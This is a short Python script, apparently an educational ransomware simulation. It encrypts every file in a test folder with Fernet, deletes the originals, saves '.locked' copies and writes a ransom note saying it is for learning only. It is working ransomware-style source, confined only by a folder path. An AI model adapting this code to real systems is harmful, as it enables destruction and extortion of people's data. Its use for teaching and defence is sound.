from cryptography.fernet import Fernet
import os

# Generate encryption key
def generate_key():
    key = Fernet.generate_key()
    with open("../key.key", "wb") as key_file:
        key_file.write(key)
    return key

# Load encryption key
def load_key():
    return open("../key.key", "rb").read()

# Encrypt all files inside test_files/
def encrypt_files():
    folder = "../test_files/"
    key = generate_key()
    fernet = Fernet(key)

    for filename in os.listdir(folder):
        file_path = os.path.join(folder, filename)

        # Ignore directories
        if os.path.isdir(file_path):
            continue

        with open(file_path, "rb") as file:
            data = file.read()

        encrypted_data = fernet.encrypt(data)

        # Save encrypted file with .locked extension
        with open(file_path + ".locked", "wb") as file:
            file.write(encrypted_data)

        # Remove original file
        os.remove(file_path)

    # Create ransom note (educational only)
    with open("../RANSOM_NOTE.txt", "w") as note:
        note.write(
            "***** Educational Simulation Only *****\n\n"
            "Your files have been encrypted for LEARNING PURPOSES ONLY.\n"
            "Use the provided decryptor.py script to restore them.\n"
            "No money or ransom is required.\n"
        )

    print("Encryption complete. Check the test_files folder.")

encrypt_files()
